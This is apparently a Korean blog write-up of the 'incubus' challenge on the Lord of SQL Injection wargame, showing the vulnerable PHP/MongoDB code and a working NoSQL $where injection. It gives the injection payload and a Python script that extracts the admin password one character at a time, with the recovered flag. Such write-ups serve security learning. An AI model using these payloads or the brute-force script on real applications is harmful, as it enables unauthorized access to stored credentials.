---
title: "[Lord of SQL Injection] LoS - incubus 문제풀이"
date: 2019-08-07
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

드디어!!! 마지막 문제인 `incubus`이다.
문제를 푼 시간보다 풀이를 적는 시간이 더 오래 걸렸던 것 같다..  

<!--more-->

코드는 다음과 같다.  

```php
--------------------------------------------------------------------------
query : {"$where":"function(){return obj.id==''&&obj.pw=='';}"}
--------------------------------------------------------------------------

<?php
  include "./config.php";
  login_chk();
  $db = mongodb_connect();
  if(preg_match('/prob|_|\(/i', $_GET['id'])) exit("No Hack ~_~");
  if(preg_match('/prob|_|\(/i', $_GET['pw'])) exit("No Hack ~_~");
  $query = array("\$where" => "function(){return obj.id=='{$_GET['id']}'&&obj.pw=='{$_GET['pw']}';}");
  echo "<hr>query : <strong>".json_encode($query)."</strong><hr><br>";
  $result = mongodb_fetch_array($db->prob_incubus->find($query));
  if($result['id']) echo "<h2>Hello {$result['id']}</h2>";

  $query = array("id" => "admin");
  $result = mongodb_fetch_array($db->prob_incubus->find($query));
  if($result['pw'] === $_GET['pw']) solve("incubus");
  highlight_file(__FILE__);
?>
```

이번에도 `id`가 `admin`일 때의 `pw` 값을 알아야 한다.
그런데 이번 문제에서는 조금 다른게 쿼리가 함수 형태로 들어갔다는 것이다.
함수 형태로 들어가 있더라도, 내가 입력 한 값에 대해서는 특별한 검증이 없기 때문에 공격이 가능하다.

내가 주로 고민했던 부분은 `obj.pw`에서 한 글자 씩을 어떻게 비교 할 것이냐는 부분이었다.
그런데 여러가지 테스트를 해 보다가 `obj.pw[0]`과 같이 사용하면 한 글자 씩 사용할 수 있는 것을 확인할 수 있었다.
일단 공격을 수행하기 위해서는 내가 의도한 코드를 실행시켜야 하는데, 여기에서는 `소스코드를 이어서 적는 방법`으로 함수의 흐름을 변경할 수 있다.
`소스코드를 이어서 적는 방법`이라고 하니 뭔가 이상한데, 예를 들면 이런 것이다.

> [Testing for NoSQL injection](https://www.owasp.org/index.php/Testing_for_NoSQL_injection#Example_1)

여기의 예시를 보면, 아래와 같은 코드가 있다.  

```javascript
db.myCollection.find( { active: true, $where: function() { return obj.credits - obj.debits < $userInput; } } );;
```

이 때, `$userInput`에 대한 검증과정이 없다면 아래와 같은 코드를 `$userInput`으로 삽입하는 것이 가능하다.    

```javascript
(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date<10000); return Math.max();})()
```

그 결과, 완성되는 코드는 다음과 같다.  

```javascript
function () { return obj.credits - obj.debits < (function(){var date = new Date(); do{curDate = new Date();}while(curDate-date<10000); return Math.max();})(); }
```

즉, 입력 값에 내가 실행하고자 하는 소스코드를 입력하여 함수의 흐름을 바꾸는 것이다.
나는 `id`가 `admin`일 때의 `pw` 값을 구해야 하므로, 실행되어야 하는 코드는 다음과 같은 형태여야 `pw`를 한 글자 씩 비교 해 전체 값을 알아낼 수 있다.  

```javascript
function(){return obj.id=='admin'&&obj.pw[0]=='a';}
```

따라서 내가 입력 한 값은 다음과 같다.  

```javascript
?id=admin'&&obj.pw[0]='a';'
```

이렇게 하면 `$query`에서 완성되는 코드는 다음과 같다.  

```javascript
function(){return obj.id=='admin'&&obj.pw[0]=='a';''&&obj.pw=='';}
```

만약 `obj.id`가 `admin`이고 `obj.pw`의  첫 번째 글자가 `a`라면 `return true`가 될 것이고, 뒤의 `''&&obj.pw=='';`는 별 다른 영향을 미치지 못할 것이다.
이를 바탕으로 아래와 같이 코드를 구현했다.  

```python
import requests
import time

flag = ""
length = 40

url = "https://los.rubiya.kr/chall/incubus_3dff9ce783c9f574edf015a7b99450d7.php?id="
session = dict(PHPSESSID = "YOUR SESSION ID")

end = False

print "[+] Start"

print "[+] Find password"
	
for j in range(0, length + 1):
	for i in range(48, 123):
		try:
			start = time.time()
			query = url + "admin'%26%26obj.pw[" + str(j) + "]=='" + str(chr(i)) + "';'"
			r = requests.post(query, cookies=session)
		except:
			print "[-] Error occur"
			continue

		if 'Hello admin' in r.text:
			flag += chr(i)
			print "[+] Found " + str(j + 1), ":", flag
			break
		if i == 122:
			end = True
			print "[+] Maybe it's end of the password"
			break
	if end:
		break

print "[+] Found password : ", flag
print "[+] End"
```

이를 실행하면 다음과 같다.  

```bash
$ python ex.py
[+] Start
[+] Find password
[+] Found 1 : b
[+] Found 2 : b4
[+] Found 3 : b47
[+] Found 4 : b478
[+] Found 5 : b4782
[+] Found 6 : b47822
[+] Found 7 : b47822e
[+] Found 8 : b47822ea
[+] Maybe it's end of the password
[+] Found password :  b47822ea
[+] End
```

와 드디어 마지막 플래그 값을 얻었다!
이를 아래와 같이 입력하면 문제를 풀 수 있다.  

```plain
?id=admin&pw=b47822ea
```

---

```php
-----------------------------------------------------------------------------------
query : {"$where":"function(){return obj.id==''&&obj.pw=='b47822ea';}"}
-----------------------------------------------------------------------------------

INCUBUS Clear!

<?php
  include "./config.php";
  login_chk();
  $db = mongodb_connect();
  if(preg_match('/prob|_|\(/i', $_GET['id'])) exit("No Hack ~_~");
  if(preg_match('/prob|_|\(/i', $_GET['pw'])) exit("No Hack ~_~");
  $query = array("\$where" => "function(){return obj.id=='{$_GET['id']}'&&obj.pw=='{$_GET['pw']}';}");
  echo "<hr>query : <strong>".json_encode($query)."</strong><hr><br>";
  $result = mongodb_fetch_array($db->prob_incubus->find($query));
  if($result['id']) echo "<h2>Hello {$result['id']}</h2>";

  $query = array("id" => "admin");
  $result = mongodb_fetch_array($db->prob_incubus->find($query));
  if($result['pw'] === $_GET['pw']) solve("incubus");
  highlight_file(__FILE__);
?>
```

---

```plain
INCUBUS Clear!!
```

드디어 `Lord of SQL Injection`을 또 다시 `All Clear` 했다!
너무 신난다 히히힣
지난번에 풀 때에는 모르는게 좀 많아서 물어보면서 했었는데, 이번에는 퇴근하고 매일매일 혼자 풀어서 올클을 한 거라 더욱 뿌듯했다.
이제는 다른 공부거리를 찾아봐야 겠다.

```plain
Lord of SQL Injection All Clear!!  
```

![](/images/los/incubus/incubus_01.png)
